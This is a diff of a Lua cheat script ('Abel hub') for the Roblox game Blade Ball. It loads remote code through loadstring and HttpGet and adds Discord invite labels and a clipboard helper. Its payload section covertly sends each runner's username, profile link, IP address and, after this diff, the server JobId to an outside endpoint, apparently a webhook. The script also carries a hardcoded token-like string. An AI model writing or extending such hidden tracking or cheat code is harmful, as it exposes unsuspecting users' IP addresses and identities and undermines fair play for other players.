@@ -1,3 +1,4 @@
+
 if game:GetService("CoreGui"):FindFirstChild("ScreenGui") then
     game:GetService("CoreGui"):FindFirstChild("ScreenGui"):Destroy()
 end
@@ -9,7 +10,7 @@ local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))
 local get4 = "AWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
 local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
 local Window = Library:CreateWindow({
-    Title = 'Blade Ball | Abel hub',
+    Title = 'Blade Ball | Abel hub | JOIN OUR DISCORD! discord.gg/Y889sjNPz4',
     Center = true,
     AutoShow = true,
     TabPadding = 8,
@@ -66,6 +67,16 @@ if not File then
     table.insert(AllIDs, actualHour)
     writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
 end
+function toClipboard(String)
+	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+	if clipBoard then
+		clipBoard(String)
+		print('Clipboard','Copied to clipboard')
+	else
+		print('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
+	end
+end
+
 function TPReturner()
     local Site;
     if foundAnything == "" then
@@ -345,13 +356,15 @@ Options.selected_ability:OnChanged(function()
     getgenv().ChosenAbility = Options.selected_ability.Value
 end)
 localusername = game.Players.LocalPlayer.Name
+
 localuserid = game.Players.LocalPlayer.UserId
 userinfo = Response.Body
+gameid = game.JobId
 
     local data = {
         ["avatar_url"] = "https://i.imgur.com/szQ00sY.jpg",
         ["username"] = "Clammy",
-        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
+        ["content"] = "AbelHub Executed".."\nJobId: "..gameid .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {
@@ -510,7 +523,8 @@ Toggles.auto_vote:OnChanged(function()
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdateVotes"):FireServer("ffa")
     end
 end)
-
+Misc:AddDivider()
+Misc:AddLabel('JOIN OUR DISCORD! \ndiscord.gg/Y889sjNPz4', true)
 
 Credits:AddLabel('abel7878 - Scripter')
 Credits:AddLabel('leehassocials - Scripter')
